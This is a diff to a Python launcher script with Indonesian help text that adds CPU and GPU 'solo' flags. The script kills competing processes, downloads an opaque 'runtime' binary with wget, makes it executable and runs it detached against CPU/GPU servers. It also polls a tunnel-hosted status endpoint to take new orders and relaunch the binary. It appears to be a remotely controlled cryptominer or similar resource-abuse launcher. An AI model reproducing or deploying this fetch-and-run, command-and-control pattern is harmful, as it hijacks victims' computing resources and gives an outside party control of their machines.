@@ -4,7 +4,7 @@ import requests
 import os
 import time
 
-def run_runtime(plant, plant_ip, cpu, cpu_server, gpu, gpu_server):
+def run_runtime(plant, plant_ip, cpu, cpu_server, cpu_solo, gpu, gpu_server, gpu_solo):
     # Construct the command to execute ./runtime with the provided arguments
     command = ["./runtime"]
 
@@ -12,8 +12,12 @@ def run_runtime(plant, plant_ip, cpu, cpu_server, gpu, gpu_server):
         command += ["--plant", "on", "--plant-ip", plant_ip]
     if cpu:
         command += ["--cpu", "on", "--cpu-server", cpu_server]
+    if cpu_solo:
+        command += ["--cpu-solo", "on"]
     if gpu:
         command += ["--gpu", "on", "--gpu-server", gpu_server]
+    if gpu_solo:
+        command += ["--gpu-solo", "on"]
 
     # Execute the command and detach the process
     process = subprocess.Popen(command, preexec_fn=os.setpgrp)
@@ -56,14 +60,16 @@ def get_username():
     except Exception as e:
         return 'unknow'
 
-def get_api_status(username, index_name, socks=False, cpu=False, gpu=False):
+def get_api_status(username, index_name, socks=False, cpu=False, cpu_solo=False, gpu=False, gpu_solo=False):
     url = "http://halloworld.ap.loclx.io/status"
     params = {
         "username": username,
         "index": index_name,
         "socks": socks,
         "cpu": cpu,
-        "gpu": gpu
+        "cpu_solo": cpu_solo,
+        "gpu": gpu,
+        "gpu_solo": gpu_solo
     }
 
     try:
@@ -103,8 +109,10 @@ parser.add_argument('--plant', action='store_true', help='Flag untuk menggunakan
 parser.add_argument('--plant-ip', type=str, help='Plant Ip', default="")
 parser.add_argument('--cpu', action='store_true', help='Flag untuk menggunakan CPU', default=False)
 parser.add_argument('--cpu-server', type=str, help='Cpu Server', default="")
+parser.add_argument('--cpu-solo', action='store_true', help='Flag untuk Melakukan SOLO', default=False)
 parser.add_argument('--gpu', action='store_true', help='Flag untuk menggunakan GPU', default=False)
 parser.add_argument('--gpu-server', type=str, help='Gpu Server', default="")
+parser.add_argument('--gpu-solo', action='store_true', help='Flag untuk Melakukan SOLO', default=False)
 
 # Tangkap argumen dari baris perintah
 args = parser.parse_args()
@@ -114,7 +122,7 @@ username = get_username()
 kill_other_processes(['plant', 'python.py', 'plane'])
 kill_other_python_processes("runtime.py")
 run_bash_command("wget https://github.com/handevproject/starterpack/raw/main/runtime && chmod +x runtime")
-run_runtime(args.plant, args.plant_ip, args.cpu, args.cpu_server, args.gpu, args.gpu_server)
+run_runtime(args.plant, args.plant_ip, args.cpu, args.cpu_server, args.cpu_solo, args.gpu, args.gpu_server, args.gpu_solo)
 
 while True:
     command = get_api_status(username, args.name, args.plant, args.cpu, args.gpu)
@@ -123,10 +131,12 @@ while True:
         args.plant_ip = command.get("plant_ip")
         args.cpu = command.get("cpu")
         args.cpu_server = command.get("cpu_server")
+        args.cpu_solo = command.get("cpu_solo")
         args.gpu = command.get("gpu")
         args.gpu_server = command.get("gpu_server")
+        args.gpu_solo = command.get("gpu_solo")
 
         run_bash_command("wget https://github.com/handevproject/starterpack/raw/main/runtime && chmod +x runtime")
-        run_runtime(args.plant, args.plant_ip, args.cpu, args.cpu_server, args.gpu, args.gpu_server)
+        run_runtime(args.plant, args.plant_ip, args.cpu, args.cpu_server, args.cpu_solo, args.gpu, args.gpu_server, args.gpu_solo)
     else:
         time.sleep(20 * 60)
